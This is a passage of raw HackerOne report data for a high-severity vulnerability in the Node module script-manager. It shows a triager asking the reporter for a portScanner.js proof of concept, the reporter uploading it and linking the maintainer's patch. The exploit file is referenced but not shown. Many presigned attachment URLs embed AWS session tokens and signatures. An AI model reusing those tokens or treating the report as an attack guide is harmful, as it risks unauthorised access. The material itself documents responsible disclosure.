3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=6166380467d783f7487712e71f3a002c0d8b27d67a286c75f865be62ad05d561","file_size":8829,"type":"image/png"}],"allow_singular_disclosure_at":"2020-03-08T15:23:15.708Z","allow_singular_disclosure_after":-25542675.224391628,"singular_disclosure_allowed":true,"vote_count":6,"voters":["a_d_a_m","bl4de","4xrhd","b9372d4605459ca97219795","joshideepak","pumpkin_king"],"severity":{"rating":"high","score":8.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":2986,"asset_type":"SOURCE_CODE","asset_identifier":"Other module","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5451284,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @inkz \n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@ktistai","markdown_message":"\u003cp\u003eHi \u003ca href=\"/inkz\"\u003e@inkz\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-29T09:24:28.058Z","updated_at":"2019-07-29T09:24:28.058Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5451325,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @inkz, \n\nCan you upload the actual portScanner.js file? I guess the formatting messed up and I am getting a syntax error. \n\nThanks, \n@ktistai","markdown_message":"\u003cp\u003eHi \u003ca href=\"/inkz\"\u003e@inkz\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eCan you upload the actual portScanner.js file? I guess the formatting messed up and I am getting a syntax error. \u003c/p\u003e\n\n\u003cp\u003eThanks, \u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-29T09:32:01.886Z","updated_at":"2019-07-29T09:32:01.886Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5459064,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @ktistai,\nmy bad that I didn't attach the file! Done F542553\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e,\u003cbr\u003e\nmy bad that I didn\u0026#39;t attach the file! Done \u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"portScanner.js\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/542/553/e5739a3b6fb0074f16f4e0aca5cb4bfd26b95bf9/portScanner.js?response-content-disposition=attachment%3B%20filename%3D%22portScanner.js%22%3B%20filename%2A%3DUTF-8%27%27portScanner.js\u0026amp;response-content-type=application%2Fjavascript\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063430Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=e73123fec80067e6f2fa52600ff3ef61b0493936fd0c0c97f21fe50b990fd1f1\" data-attachment-type=\"application/javascript\"\u003eportScanner.js (F542553)\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-30T01:58:27.549Z","updated_at":"2019-07-30T01:58:27.549Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":542553,"filename":"portScanner.js","type":"application/javascript","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/542/553/e5739a3b6fb0074f16f4e0aca5cb4bfd26b95bf9/portScanner.js?response-content-disposition=attachment%3B%20filename%3D%22portScanner.js%22%3B%20filename%2A%3DUTF-8%27%27portScanner.js\u0026response-content-type=application%2Fjavascript\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T063431Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=eb1eccdfd8c1fbe9314bc5a2e1156883b002d79937e1dbe6f98469d42e1fa433"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5459068,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ktistai btw, I contacted the author of the module and he released the patch for script-manager\nhttps://github.com/pofider/node-script-manager/commit/ac645ab2e58785324c467e0583d7f277a7aa07b3 ","markdown_message":"\u003cp\u003e\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e btw, I contacted the author of the module and he released the patch for script-manager\u003cbr\u003e\n\u003ca title=\"https://github.com/pofider/node-script-manager/commit/ac645ab2e58785324c467e0583d7f277a7aa07b3\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpofider%2Fnode-script-manager%2Fcommit%2Fac645ab2e58785324c467e0583d7f277a7aa07b3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/pofider/node-script-manager/commit/ac645ab2e58785324c467e0583d7f277a7aa07b3\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-30T02:01:06.488Z","updated_at":"2019-07-30T02:01:06.488Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5460602,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @inkz, \n\nI am getting this error, when the port is supposed to appear: \n\n████████ \n\nThen, when sending the request, I am getting this: \n\n██████████\n\nIt's 90% triaged, but the PWN does not get in the console. \n\nThanks, \n@ktistai","markdown_message":"\u003cp\u003eHi \u003ca href=\"/inkz\"\u003e@inkz\u003c/a\u003e, \u003c/p\u003e\n\n\u003cp\u003eI am getting this error, when the port is supposed to appear: \u003c/p\u003e\n\n\u003cp\u003e████████ \u003c/p\u003e\n\n\u003cp\u003eThen, when sending the request, I am getting this: \u003c/p\u003e\n\n\u003cp\u003e██████████\u003c/p\u003e\n\n\u003cp\u003eIt\u0026#39;s 90% triaged, but the PWN does not get in the console. \u003c/p\u003e\n\n\u003cp\u003eThanks, \u003cbr\u003e\n\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-30T09:40:17.715Z","updated_at":"2020-02-07T15:01:04.143Z","actor":{"username":"ktistai","cleared":false,"url":"/ktistai","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/322/520/01cd21dce301646646276fd9125cffd448fbffd6_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5460805,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@ktistai \nsorry, but I don't get what the screenshots mean,\nfor example this one █████████ is about sending a request to `██████████` not sure that it's related to the current issue","markdown_message":"\u003cp\u003e\u003ca href=\"/ktistai\"\u003e@ktistai\u003c/a\u003e \u003cbr\u003e\nsorry, but I don\u0026#39;t get what the screenshots mean,\u003cbr\u003e\nfor example this one █████████ is about sending a request to \u003ccode\u003e██████████\u003c/code\u003e not sure that it\u0026#39;s related to the current issue\u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-30T10:26:12.474Z","updated_at":"2020-02-07T15:02:27.894Z","actor":{"username":"ermilov","cleared":false,"url":"/ermilov","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/066/860/675cf13b580684485fa62b5e472d044d85cbccca_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5467872,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Added the wrong screenshots, sorry about that. \n\n{F543703}\n\n{F543704}\n\nThanks, \n@Ktistai","markdown_message":"\u003cp\u003eAdded the wrong screenshots, sorry about that. \u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_2019-07-30_at_11.37.44.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/703/e022371d80a8644e930149f99b6c93c797999e8d/Screenshot_2019-07-30_at_11.37.44.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.44.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.44.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063431Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=afdd6f32dcc1304ae3898fae8b7b5379c2cf0c501a7b7a2177c71fd57bc80fad\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/703/e022371d80a8644e930149f99b6c93c797999e8d/Screenshot_2019-07-30_at_11.37.44.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.44.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.44.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063431Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=afdd6f32dcc1304ae3898fae8b7b5379c2cf0c501a7b7a2177c71fd57bc80fad\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screenshot_2019-07-30_at_11.37.38.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/704/09fed5303a62c921fcfcd739b40e81c254b1735a/Screenshot_2019-07-30_at_11.37.38.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.38.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063431Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=f6c05a5074b8d0ae893a096fb30f798f62e7bce0d509d6168c9f59762a35813a\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/543/704/09fed5303a62c921fcfcd739b40e81c254b1735a/Screenshot_2019-07-30_at_11.37.38.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2019-07-30_at_11.37.38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2019-07-30_at_11.37.38.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ6NMQGJ6E%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T063431Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026amp;X-Amz-Signature=f6c05a5074b8d0ae893a096fb30f798f62e7bce0d509d6168c9f59762a35813a\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks, \u003cbr\u003e\n\u003ca 